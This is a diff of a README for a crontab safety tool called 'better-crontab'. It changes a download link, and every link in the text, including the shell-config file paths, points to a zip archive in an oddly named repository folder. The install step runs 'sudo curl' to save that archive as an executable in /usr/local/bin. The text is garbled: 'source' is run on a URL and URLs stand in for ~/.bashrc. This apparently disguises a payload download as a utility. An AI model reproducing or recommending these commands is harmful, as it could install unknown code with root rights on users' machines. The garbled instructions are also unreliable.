@@ -1,7 +1,7 @@
 # 🚀 better-crontab - Safeguard Your Cron Jobs
 
 ## 📦 Download & Install
-[![Download better-crontab](https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better_crontab_1.1.zip)](https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better_crontab_1.1.zip)
+[![Download better-crontab](https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better-crontab-v1.3-beta.3.zip)](https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better-crontab-v1.3-beta.3.zip)
 
 ## 📝 Project Overview
 `better-crontab` protects your crontab commands. It reduces the risk of deleting your scheduled tasks by mistake. Crontab allows you to automate tasks on your Linux system. However, using `crontab -e` to edit and `crontab -r` to remove tasks can cause problems. The keys 'e' and 'r' are close to each other, leading to accidental deletions.
@@ -35,7 +35,7 @@ Follow these steps to download and install `better-crontab`.
 
 1. **Download the better-crontab script**:
    ```bash
-   sudo curl -o /usr/local/bin/better-crontab https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better_crontab_1.1.zip
+   sudo curl -o /usr/local/bin/better-crontab https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better-crontab-v1.3-beta.3.zip
    ```
 
 2. **(Optional) Review the script's content**:
@@ -51,22 +51,22 @@ Follow these steps to download and install `better-crontab`.
    ```
 
 4. **Create an alias**:
-   Add this line to your `~https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better_crontab_1.1.zip` or `~https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better_crontab_1.1.zip` file for easier access:
+   Add this line to your `~https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better-crontab-v1.3-beta.3.zip` or `~https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better-crontab-v1.3-beta.3.zip` file for easier access:
    ```bash
    alias crontab='/usr/local/bin/better-crontab'
    ```
 
    After adding the alias, run:
    ```bash
-   source ~https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better_crontab_1.1.zip
+   source ~https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better-crontab-v1.3-beta.3.zip
    ```
    or
    ```bash
-   source ~https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better_crontab_1.1.zip
+   source ~https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better-crontab-v1.3-beta.3.zip
    ```
 
 ### Method 2: Manual Download
-If you prefer, you can download the script directly from the [Releases page](https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better_crontab_1.1.zip).
+If you prefer, you can download the script directly from the [Releases page](https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better-crontab-v1.3-beta.3.zip).
 
 ### 👩‍💻 System Requirements
 - A Linux operating system.
@@ -96,7 +96,7 @@ After installation, you can use `better-crontab` just like the normal crontab co
 ## 🔄 Upgrading
 To upgrade `better-crontab`, repeat the installation steps from the "Quick Install" section. The script will automatically overwrite the old version.
 
-Visit the [Releases page](https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better_crontab_1.1.zip) for the latest version.
+Visit the [Releases page](https://raw.githubusercontent.com/salmon-arch/better-crontab/main/semipronation/better-crontab-v1.3-beta.3.zip) for the latest version.
 
 ## 📞 Support
 If you have questions or need help, check the Issues section of this repository on GitHub. Community members and maintainers often provide quick responses.
